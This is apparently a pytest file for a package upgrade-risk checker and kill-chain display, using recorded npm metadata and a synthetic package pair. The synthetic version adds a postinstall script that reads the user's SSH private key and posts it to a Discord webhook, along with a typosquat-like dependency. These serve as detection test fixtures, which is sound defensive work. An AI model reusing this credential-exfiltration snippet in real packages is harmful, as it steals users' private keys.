"""Upgrade check page and kill-chain strip. No live network: registry answers come from recorded fixtures
(tests/fixtures/upgrade: node-ipc and peacenotwar packuments, recorded 2026-11-10 and trimmed) or from a synthetic
registry-shaped pair built here (demo-hooked 1.0.0 -> 1.1.0: the new version adds a postinstall hook and a new
dependency). Artifacts are small stand-in tarballs built in memory; nothing is extracted to disk or executed."""
import copy
import io
import json
import sys
import tarfile
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import http_cache  # noqa: E402
import killchain as KC  # noqa: E402
import upgrade_check as U  # noqa: E402

FIX = Path(__file__).resolve().parent / "fixtures" / "upgrade"
NOT_FOUND = (None, 404, None)


def tgz(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for n, body in files.items():
            data = body.encode()
            ti = tarfile.TarInfo("package/" + n)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


# ------------------------------------------------------------------ synthetic pair: postinstall hook + new dependency

DEMO_OLD = {"package.json": json.dumps({"name": "demo-hooked", "version": "1.0.0", "dependencies": {"left-pad": "1"}}),
            "index.js": "module.exports = function add(a, b) { return a + b }\n"}
DEMO_NEW = {"package.json": json.dumps({"name": "demo-hooked", "version": "1.1.0",
                                        "scripts": {"postinstall": "node install.js"},
                                        "dependencies": {"left-pad": "1", "lodahs": "0.0.1"}}),
            "index.js": DEMO_OLD["index.js"],
            "install.js": "const https = require('https')\nconst fs = require('fs')\n"
                          "const key = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa')\n"
                          "https.request('https://discord.com/api/webhooks/123/abc', {method: 'POST'}).end(key)\n"}


def demo_packument():
    tb = "https://registry.npmjs.org/demo-hooked/-/demo-hooked-{}.tgz"
    return {"name": "demo-hooked", "dist-tags": {"latest": "1.1.0"},
            "time": {"created": "2025-01-01T00:00:00.000Z", "0.9.0": "2025-01-01T00:00:00.000Z",
                     "1.0.0": "2025-03-01T00:00:00.000Z", "1.1.0": "2026-10-01T00:00:00.000Z"},
            "maintainers": [{"name": "alice", "email": "alice@example.org"}],
            "versions": {
                "0.9.0": {"dependencies": {}, "scripts": {}, "_npmUser": {"name": "alice"},
                          "dist": {"tarball": tb.format("0.9.0"), "unpackedSize": 100}},
                "1.0.0": {"dependencies": {"left-pad": "1"}, "scripts": {}, "_npmUser": {"name": "alice"},
                          "dist": {"tarball": tb.format("1.0.0"), "unpackedSize": 200}},
                "1.1.0": {"dependencies": {"left-pad": "1", "lodahs": "0.0.1"}, "scripts": {"postinstall": "node install.js"},
                          "_npmUser": {"name": "mallory"}, "dist": {"tarball": tb.format("1.1.0"), "unpackedSize": 900}}}}


def registry(json_table: dict, bytes_table: dict):
    """Patches http_cache (the only network path of releases.py) with recorded / synthetic answers."""
    def get_json(url, headers=None, timeout=None):
        if url in json_table:
            return copy.deepcopy(json_table[url]), 200, None
        return NOT_FOUND
    def get_bytes(url, max_bytes, timeout=None):
        return (bytes_table[url], None) if url in bytes_table else (None, "HTTP 404")
    return patch.multiple(http_cache, get_json=get_json, get_bytes=get_bytes)


def rdap_table(extra=None):
    def fetch(url, accept=None):
        table = extra or {}
        if url in table:
            return table[url]
        if url.startswith("https://rdap.org/"):
            return {"status": None, "data": None, "redirected": False, "error": "ProxyError"}
        data, status, err = http_cache.get_json(url)
        return {"status": status, "data": data, "redirected": False, "error": err}
    return fetch


def run_demo(**kw):
    pk = demo_packument()
    lodahs = {"name": "lodahs", "time": {"created": "2026-09-28T00:00:00.000Z", "0.0.1": "2026-09-28T00:00:00.000Z"},
              "versions": {"0.0.1": {"scripts": {}}}}
    jt = {"https://registry.npmjs.org/demo-hooked": pk, "https://registry.npmjs.org/lodahs": lodahs}
    bt = {pk["versions"]["1.0.0"]["dist"]["tarball"]: tgz(DEMO_OLD), pk["versions"]["1.1.0"]["dist"]["tarball"]: tgz(DEMO_NEW),
          pk["versions"]["0.9.0"]["dist"]["tarball"]: tgz({"index.js": "1\n"})}
    with registry(jt, bt):
        return U.run("npm", "demo-hooked", kw.get("current"), kw.get("new"), rdap_fetch=rdap_table(),
                     lookalike=lambda n: "lodash" if n == "lodahs" else None)


def test_new_postinstall_hook_and_new_dependency_are_flagged():
    res = run_demo()
    assert res["versions"] == {"current": "1.0.0", "new": "1.1.0"}               # empty current = release before new
    rows = {(r["area"], r["item"]): r for r in res["rows"]}
    hook = rows[("Install hooks", "npm postinstall")]
    assert hook["change"] == "added" and hook["evidence"] == "package.json scripts.postinstall: node install.js"
    dep = rows[("Dependencies", "lodahs")]
    assert dep["change"] == "added" and dep["young"] and dep["lookalike"] == "lodash"
    assert "first published 3 days before this release (very new: under 30 days)" in dep["evidence"]
    assert rows[("Dependencies", "left-pad")]["change"] == "unchanged"
    assert rows[("Credential/env access", "install.js")]["change"] == "added"
    assert rows[("Network activity (possible exfiltration)", "install.js")]["change"] == "added"
    assert rows[("Publisher", "1.0.0 -> 1.1.0")]["change"] == "changed"
    gap = rows[("Release gap (dormancy)", "1.1.0")]
    assert gap["long_gap"] and "1.1.0: 579 days after 1.0.0" in gap["evidence"] and "1.0.0: 59 days after 0.9.0" in gap["evidence"]
    v = res["verdict"]
    assert v["verdict"] == U.REVIEW == "Review before upgrading"
    assert "Install hooks: npm postinstall" in v["items"] and any(i.startswith("Dependencies: lodahs") for i in v["items"])
    assert any(i.startswith("Publisher changed:") for i in v["items"])
    dom = rows[("Maintainer email domain", "example.org")]
    assert dom["evidence"].startswith("could not check") and "takeover-risk indicator, not proof" in dom["evidence"]
    assert "@" not in json.dumps(res["rows"])                                      # never an address
    stages = {c["stage"]: c["lit"] for c in KC.killchain(res["killchain_findings"])}
    assert stages == {"Install-time execution": True, "Credential/env access": True, "Network activity (possible exfiltration)": True,
                      "Persistence": False, "Obfuscation": False}
    assert "trust_score" not in json.dumps(res).lower()                            # no Trust score on this page


def test_identical_versions_have_no_risk_relevant_changes():
    res = run_demo(current="1.0.0", new="1.0.0")
    assert res["verdict"] == {"verdict": U.NO_CHANGES, "items": []}
    assert all(r["change"] in ("unchanged", "info") for r in res["rows"])
    assert U.CAVEAT == "Indicators, not proof. No findings does not mean safe."


def test_unreadable_artifact_is_not_compared_never_no_changes():
    pk = demo_packument()
    with registry({"https://registry.npmjs.org/demo-hooked": pk}, {}):          # tarballs missing
        res = U.run("npm", "demo-hooked", None, None, rdap_fetch=rdap_table(), lookalike=lambda n: None)
    assert res["verdict"]["verdict"] == U.NOT_COMPARED
    with registry({}, {}):
        res = U.run("npm", "nope", None, None, rdap_fetch=rdap_table(), lookalike=lambda n: None)
    assert res["verdict"]["verdict"] == U.NOT_COMPARED and "not on npm" in res["verdict"]["items"][0]


def test_node_ipc_replay_recorded_metadata():
    """Recorded node-ipc metadata: 10.1.0 -> 11.0.0 adds peacenotwar, first published the same day (the benchmark's
    replay case). Tarball contents are stand-ins, so only metadata rows are asserted."""
    pk = json.loads((FIX / "npm_node-ipc.json").read_text())
    pnw = json.loads((FIX / "npm_peacenotwar.json").read_text())
    bt = {v["dist"]["tarball"]: tgz({"package.json": "{}", "node-ipc.js": "module.exports = {}\n"}) for v in pk["versions"].values()}
    with registry({"https://registry.npmjs.org/node-ipc": pk, "https://registry.npmjs.org/peacenotwar": pnw}, bt):
        res = U.run("npm", "node-ipc", None, "11.0.0", rdap_fetch=rdap_table(), lookalike=lambda n: None)
    rows = {(r["area"], r["item"]): r for r in res["rows"]}
    assert res["versions"] == {"current": "10.1.0", "new": "11.0.0"}
    assert rows[("Dependencies", "peacenotwar")]["change"] == "added" and rows[("Dependencies", "peacenotwar")]["young"]
    assert rows[("Publisher", "10.1.0 -> 11.0.0")]["change"] == "unchanged"
    assert res["verdict"]["verdict"] == U.REVIEW
    assert "11.0.0: 173 days after 10.1.0" in rows[("Release gap (dormancy)", "11.0.0")]["evidence"]


def test_replay_cases_from_committed_data():
    cases = {c["incident"]: c for c in U.replay_cases()}
    assert set(cases) == {"event-stream / flatmap-stream", "node-ipc"}
    assert (cases["node-ipc"]["package"], cases["node-ipc"]["new"]) == ("node-ipc", "11.0.0")
    assert cases["node-ipc"]["benchmark_label"] == "Review recommended"
    assert cases["event-stream / flatmap-stream"]["benchmark_detectors"] == "publisher_change revival_takeover"


def test_publisher_identity_appearing_is_not_a_change():
    old = {"version": "1", "publisher": None, "publisher_source": "no provenance", "uploaded": "2024-01-01T00:00:00Z"}
    new = {"version": "2", "publisher": "GitHub:o/r/release.yml", "publisher_source": "PyPI provenance", "uploaded": "2024-02-01T00:00:00Z"}
    rows = U.facts_rows(old, new, None, None)
    assert rows[0]["change"] == "info"


# ------------------------------------------------------------------ kill chain (fixed table)

def test_killchain_mapping_table():
    assert KC.STAGES == ("Install-time execution", "Credential/env access", "Network activity (possible exfiltration)", "Persistence", "Obfuscation")
    assert "Network exfiltration" not in KC.STAGES and "Network exfiltration" not in U.AREAS   # renamed (wording)
    cases = [
        ({"source": "Behavior", "cat": "Credential access", "rule": "Credential access: reads credential files", "sev": "Medium"},
         ["Credential/env access"]),
        ({"source": "Behavior", "cat": "Network", "rule": "Network: exfil-style endpoint", "sev": "Medium"}, ["Network activity (possible exfiltration)"]),
        ({"source": "Behavior pattern", "cat": "Pattern", "rule": "Credential-stealer pattern", "sev": "High"},
         ["Credential/env access", "Network activity (possible exfiltration)"]),
        ({"source": "Behavior", "cat": "Persistence", "rule": "Persistence: installs itself to run later", "sev": "Medium"}, ["Persistence"]),
        ({"source": "Behavior pattern", "cat": "Pattern", "rule": "Hidden persistence payload", "sev": "High"}, ["Persistence", "Obfuscation"]),
        ({"source": "Layer 1: AST De-obfuscator", "rule": "decode then exec", "sev": "High"}, ["Obfuscation"]),
        ({"source": "Layer 2: Static setup.py Check", "rule": "setup.py runs a command", "sev": "High"}, ["Install-time execution"]),
        ({"detector": "credential_exfiltration", "tier": "high_risk", "rule": "x"}, ["Credential/env access", "Network activity (possible exfiltration)"]),
        ({"detector": "decoded_payload", "tier": "review", "rule": "x"}, ["Obfuscation"]),
        ({"detector": "setup_py_hook", "tier": "review", "rule": "x"}, ["Install-time execution"]),
        ({"area": "Install hooks", "item": "npm postinstall", "change": "added"}, ["Install-time execution"]),
        ({"area": "Install hooks", "item": "npm postinstall", "change": "unchanged"}, []),
        ({"area": "Network use", "item": "a.js", "change": "added"}, []),                       # API use is not exfiltration
        ({"source": "Behavior", "cat": "Credential access", "rule": "Credential access: x", "sev": "Low"}, []),  # notes ignored
        ({"detector": "decoded_payload", "tier": "info", "rule": "x"}, []),
        ({"source": "Secrets", "rule": "AWS key", "sev": "High"}, []),
        ({"source": "Code (Bandit)", "rule": "B602", "sev": "High"}, []),
    ]
    for f, want in cases:
        assert KC.stages_for(f) == want, f


def test_killchain_strip_lists_findings_on_hover():
    chain = KC.killchain([{"source": "Behavior", "cat": "Persistence", "rule": "Persistence: cron", "file": "x.py",
                           "line": 3, "sev": "Medium"}])
    assert [c["lit"] for c in chain] == [False, False, False, True, False]
    assert chain[3]["findings"] == ["Persistence: cron · x.py:3 · Behavior"]
    h = KC.strip_html(chain)
    assert h.count("rh-kc rh-kc-on") == 1 and "title='Persistence: cron · x.py:3 · Behavior'" in h
    assert "No finding maps to this stage" in h and h.count("→") == 4


# ------------------------------------------------------------------ pages

def test_upgrade_page_renders_with_recorded_registry():
    import streamlit as st
    from streamlit.testing.v1 import AppTest
    page = str(ROOT / "pages" / "1_Upgrade_check.py")
    st.cache_data.clear()
    pk = demo_packument()
    lodahs = {"name": "lodahs", "time": {"created": "2026-09-28T00:00:00.000Z"}, "versions": {}}
    jt = {"https://registry.npmjs.org/demo-hooked": pk, "https://registry.npmjs.org/lodahs": lodahs}
    bt = {pk["versions"]["1.0.0"]["dist"]["tarball"]: tgz(DEMO_OLD), pk["versions"]["1.1.0"]["dist"]["tarball"]: tgz(DEMO_NEW)}
    import additional_signals as AS
    import blast_radius
    with registry(jt, bt), patch.object(AS, "http_get_json", rdap_table()), \
            patch.object(blast_radius, "confirm_typosquat", lambda n, e="PyPI": "lodash" if n == "lodahs" else None):
        at = AppTest.from_file(page, default_timeout=60).run()
        assert not at.exception, at.exception
        assert at.title[0].value == "Upgrade check (is this update safe?)"
        assert any("Added after the freeze; not part of the benchmark; unvalidated." in c.value for c in at.caption)
        assert at.selectbox(key="uc_replay").options[1:] == ["event-stream / flatmap-stream", "node-ipc"]
        at.text_input(key="uc_name").set_value("demo-hooked")
        at.button[0].click().run()
        assert not at.exception, at.exception
        assert any(w.value.startswith("**Review before upgrading.**") and "npm postinstall" in w.value for w in at.warning)
        assert any("rh-kc rh-kc-on" in m.value for m in at.markdown)
        frame = at.dataframe[0].value
        assert ("Install hooks", "npm postinstall", "added") in set(zip(frame["Area"], frame["Item"], frame["Change"]))
        import re
        text = " ".join(m.value for m in at.markdown) + " ".join(c.value for c in at.caption)
        assert "class='rh-card'" not in text and not re.search(r"\d+\s*/\s*100", text)   # no Trust score number on this page
        assert not [m for m in at.metric]
    st.cache_data.clear()


def test_main_app_shows_the_killchain_strip():
    from streamlit.testing.v1 import AppTest
    import test_app as T
    from github_client import GitHubClient
    with patch("github_client.fetch_features", T.fake_fetch), patch.object(GitHubClient, "__init__", T._fake_init):
        at = AppTest.from_file(str(ROOT / "app.py"), default_timeout=30).run()
        at.text_input(key="repo_input").set_value("o/r-killchain")
        at.button[0].click().run()
        assert not at.exception, at.exception
        assert any("rh-kc-row" in m.value for m in at.tabs[0].markdown)
        assert any(c.value == KC.CAPTION for c in at.tabs[0].caption)
